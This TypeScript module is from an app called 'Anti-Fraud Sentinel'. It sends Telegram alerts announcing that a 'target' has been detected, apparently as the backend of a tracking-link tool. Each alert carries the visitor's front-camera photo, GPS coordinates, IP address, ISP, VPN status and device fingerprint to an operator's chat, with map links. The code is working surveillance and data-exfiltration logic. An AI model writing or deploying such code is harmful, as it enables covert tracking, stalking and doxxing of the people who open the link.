import type { VerificationSession } from './types';
import { formatWIB } from './security';

function getTelegramConfig() {
  const botToken = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();
  return { botToken, chatId };
}

function escapeHtml(text: any): string {
  if (text == null) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function stripHtml(html: string): string {
  return html.replace(/<[^>]*>?/gm, '');
}

/**
 * Validates whether a URL is a publicly accessible HTTP/HTTPS URL accepted by Telegram
 * Telegram rejects localhost, 127.0.0.1, and private hostnames in inline keyboard buttons
 */
export function isValidPublicUrl(urlStr: string): boolean {
  try {
    const parsed = new URL(urlStr);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    const hostname = parsed.hostname.toLowerCase();
    if (
      hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '0.0.0.0' ||
      hostname.endsWith('.local') ||
      hostname.endsWith('.internal')
    ) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

/**
 * Test the Telegram Bot token and connection to recipient chat
 */
export async function testTelegramConnection(): Promise<{ success: boolean; message: string; details?: any }> {
  const { botToken, chatId } = getTelegramConfig();
  if (!botToken) {
    return { success: false, message: 'TELEGRAM_BOT_TOKEN belum disetel di environment variables (.env).' };
  }
  if (!chatId) {
    return { success: false, message: 'TELEGRAM_CHAT_ID belum disetel di environment variables (.env).' };
  }

  try {
    const meRes = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
    const meJson = await meRes.json();
    if (!meJson.ok) {
      return { success: false, message: `Token bot tidak valid: ${meJson.description}`, details: meJson };
    }

    const testMsg = `🔔 <b>TES KONEKSI BOT TELEGRAM</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ Bot <b>@${meJson.result.username}</b> terhubung aktif dengan Anti-Fraud Sentinel!\n⏰ Waktu server: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`;
    const sendRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: testMsg,
        parse_mode: 'HTML'
      })
    });
    const sendJson = await sendRes.json();
    if (!sendJson.ok) {
      return { success: false, message: `Gagal mengirim ke Chat ID ${chatId}: ${sendJson.description}`, details: sendJson };
    }

    return {
      success: true,
      message: `Berhasil! Pesan tes terkirim ke @${sendJson.result.chat.username || chatId}.`,
      details: sendJson.result
    };
  } catch (err: any) {
    return { success: false, message: `Koneksi gagal: ${err.message || err}` };
  }
}

/**
 * Dispatch real-time investigation alert to Telegram bot
 */
export async function sendTelegramAlert(
  session: VerificationSession,
  status: 'VERIFIED' | 'FAILED' = 'VERIFIED',
  failureReason: string = ''
): Promise<boolean> {
  const { botToken, chatId } = getTelegramConfig();
  if (!botToken || !chatId) {
    console.warn('[Telegram Alert] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing. Notification skipped.');
    return false;
  }

  try {
    const isVerified = status === 'VERIFIED';
    const statusEmoji = isVerified ? '✅ VERIFIED (IZIN LENGKAP)' : '⚠️ FALLBACK / DILEWATI';
    const hasCoordinates =
      session.location &&
      session.location.latitude !== 0 &&
      session.location.longitude !== 0;

    const deviceName =
      session.device?.deviceModel || session.device?.platform || 'Unknown Device';
    const ip = session.ipAddress || '127.0.0.1';

    const battText =
      session.device?.batteryLevel != null
        ? `${session.device.batteryLevel}% ${session.device.isCharging ? '⚡(Charging)' : '🔋(Battery)'}`
        : '-';

    const netText = session.device?.effectiveType
      ? `${session.device.effectiveType.toUpperCase()} ${session.device.networkType ? `/ ${session.device.networkType}` : ''} ${session.device.downlinkSpeed ? `(${session.device.downlinkSpeed} Mbps, ${session.device.rtt ?? 0}ms)` : ''}`
      : (session.device?.networkType || '-');

    const display = session.device?.screenWidth
      ? `${session.device.screenWidth}x${session.device.screenHeight} (${session.device.devicePixelRatio || 1}x) · ${session.device.colorGamut?.toUpperCase() || 'sRGB'} · ${session.device.isDarkMode ? 'Dark' : 'Light'}`
      : '-';

    const storage = session.device?.storageEstimate
      ? `${(session.device.storageEstimate.available / (1024 * 1024 * 1024)).toFixed(1)} GB Free`
      : '-';

    const reasonText = failureReason && failureReason !== '-'
      ? `\n⚠️ <b>Keterangan:</b> ${escapeHtml(failureReason)}`
      : '';

    const ipIntel = session.ipIntelligence;
    const ispName = ipIntel?.isp || 'Unknown ISP';
    const asInfo = ipIntel?.as ? ` (${escapeHtml(ipIntel.as)})` : '';
    const cityLoc = ipIntel?.locationSummary || '-';

    let vpnBadge = '✅ Direct / Residential';
    if (ipIntel?.isVpn) {
      vpnBadge = `⚠️ <b>VPN / PROXY DETECTED!</b> (${escapeHtml(ipIntel.vpnType || 'Proxy/Hosting')})`;
    }

    const messageHtml = `🚨 <b>TARGET TERDETEKSI MASUK!</b> 🚨
━━━━━━━━━━━━━━━━━━━━
🆔 <b>Nota ID:</b> <code>${escapeHtml(session.notaId)}</code>
📊 <b>Status:</b> <b>${statusEmoji}</b>${reasonText}

📱 <b>Perangkat:</b> <b>${escapeHtml(deviceName)}</b>
🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>
🏢 <b>ISP / Provider:</b> <b>${escapeHtml(ispName)}</b>${asInfo}
🛡️ <b>Deteksi VPN:</b> ${vpnBadge}
🏙️ <b>Estimasi Kota ISP:</b> ${escapeHtml(cityLoc)}
🔋 <b>Baterai:</b> ${escapeHtml(battText)}
📶 <b>Jaringan:</b> ${escapeHtml(netText)}
💻 <b>Layar & Display:</b> ${escapeHtml(display)}
💾 <b>Penyimpanan:</b> ${escapeHtml(storage)}
${hasCoordinates ? `📍 <b>Koordinat GPS:</b> <code>${session.location!.latitude}, ${session.location!.longitude}</code> (±${session.location!.accuracy || 20}m)` : '📍 <b>GPS:</b> Tidak diizinkan / ditolak'}
━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${formatWIB(session.verifiedAt || Date.now())}`;

    // Construct Inline Keyboard buttons with strict public URL validation
    const inlineKeyboard: any[][] = [];
    const buttonRow: any[] = [];

    if (hasCoordinates) {
      buttonRow.push({
        text: '📍 Buka Google Maps',
        url: `https://www.google.com/maps?q=${session.location!.latitude},${session.location!.longitude}`
      });
    } else if (ipIntel?.lat && ipIntel?.lon) {
      buttonRow.push({
        text: '🗺️ Estimasi Wilayah ISP',
        url: `https://www.google.com/maps?q=${ipIntel.lat},${ipIntel.lon}`
      });
    }

    // Only add Dashboard button if site URL is a publicly accessible URL (Telegram strictly rejects localhost/127.0.0.1)
    const configuredUrl = (process.env.PUBLIC_SITE_URL || '').trim().replace(/\/$/, '');
    const candidateUrl = isValidPublicUrl(configuredUrl) ? configuredUrl : 'https://anti-fraud-eight.vercel.app';
    if (isValidPublicUrl(candidateUrl)) {
      buttonRow.push({
        text: '📊 Dashboard Admin',
        url: `${candidateUrl}/admin`
      });
    }

    if (buttonRow.length > 0) {
      inlineKeyboard.push(buttonRow);
    }

    const replyMarkup = inlineKeyboard.length > 0 ? { inline_keyboard: inlineKeyboard } : undefined;

    // Helper to send text message with HTML fallback to plain text if entity parsing fails
    const sendTextMessage = async (text: string): Promise<boolean> => {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);

      try {
        const payload: Record<string, any> = {
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        };
        if (replyMarkup) payload.reply_markup = replyMarkup;

        let res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: controller.signal
        });

        if (res.ok) {
          clearTimeout(timeoutId);
          return true;
        }

        const errText = await res.text();
        console.warn(`[Telegram Alert] sendMessage with HTML failed (${res.status}): ${errText}`);

        // If entity parsing failed, retry as clean plain text
        if (errText.includes('can\'t parse entities') || errText.includes('entity')) {
          console.log('[Telegram Alert] Retrying dispatch as plain text...');
          const plainPayload: Record<string, any> = {
            chat_id: chatId,
            text: stripHtml(text)
          };
          if (replyMarkup) plainPayload.reply_markup = replyMarkup;

          res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(plainPayload),
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          if (res.ok) return true;
          console.error(`[Telegram Alert] Plain text retry also failed:`, await res.text());
        }

        clearTimeout(timeoutId);
        return false;
      } catch (err: any) {
        clearTimeout(timeoutId);
        console.error('[Telegram Alert] sendMessage network error:', err.message || err);
        return false;
      }
    };

    // If front camera photo is available, send as photo
    if (session.frontCamera?.dataUri && session.frontCamera.dataUri.startsWith('data:image/')) {
      try {
        const cleanBase64 = session.frontCamera.dataUri.replace(/^data:image\/\w+;base64,/, '');
        const imageBuffer = Buffer.from(cleanBase64, 'base64');
        const blob = new Blob([imageBuffer], { type: 'image/jpeg' });

        // Telegram sendPhoto caption has a strict maximum of 1024 characters
        let photoCaption = messageHtml;
        let needFollowUpText = false;

        if (photoCaption.length > 1020) {
          needFollowUpText = true;
          // Create concise summary caption under 1000 characters
          photoCaption = `🚨 <b>TARGET TERDETEKSI MASUK!</b> 🚨
━━━━━━━━━━━━━━━━━━━━
🆔 <b>Nota ID:</b> <code>${escapeHtml(session.notaId)}</code>
📊 <b>Status:</b> <b>${statusEmoji}</b>${reasonText}
📱 <b>Perangkat:</b> <b>${escapeHtml(deviceName)}</b>
🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>
🏢 <b>ISP:</b> <b>${escapeHtml(ispName)}</b>
🛡️ <b>VPN:</b> ${vpnBadge}
${hasCoordinates ? `📍 <b>GPS:</b> <code>${session.location!.latitude}, ${session.location!.longitude}</code>` : '📍 <b>GPS:</b> Tidak diizinkan'}
━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${formatWIB(session.verifiedAt || Date.now())}`;
        }

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `target_${session.id}.jpg`);
        formData.append('caption', photoCaption);
        formData.append('parse_mode', 'HTML');
        if (replyMarkup) {
          formData.append('reply_markup', JSON.stringify(replyMarkup));
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);

        const photoRes = await fetch(
          `https://api.telegram.org/bot${botToken}/sendPhoto`,
          {
            method: 'POST',
            body: formData,
            signal: controller.signal
          }
        );
        clearTimeout(timeoutId);

        if (photoRes.ok) {
          // If message was split due to 1024 caption limit, send full detailed telemetry in follow-up
          if (needFollowUpText) {
            await sendTextMessage(messageHtml);
          }
          return true;
        }

        const photoErrText = await photoRes.text();
        console.warn(`[Telegram Alert] sendPhoto failed (${photoRes.status}): ${photoErrText}. Falling back to text message.`);
      } catch (photoErr: any) {
        console.warn('[Telegram Alert] Failed to send photo to Telegram, falling back to text message:', photoErr.message || photoErr);
      }
    }

    // Fallback: Send rich text message (supports up to 4096 characters)
    return await sendTextMessage(messageHtml);
  } catch (err: any) {
    console.error('[Telegram Alert] Fatal error dispatching notification:', err.message || err);
    return false;
  }
}

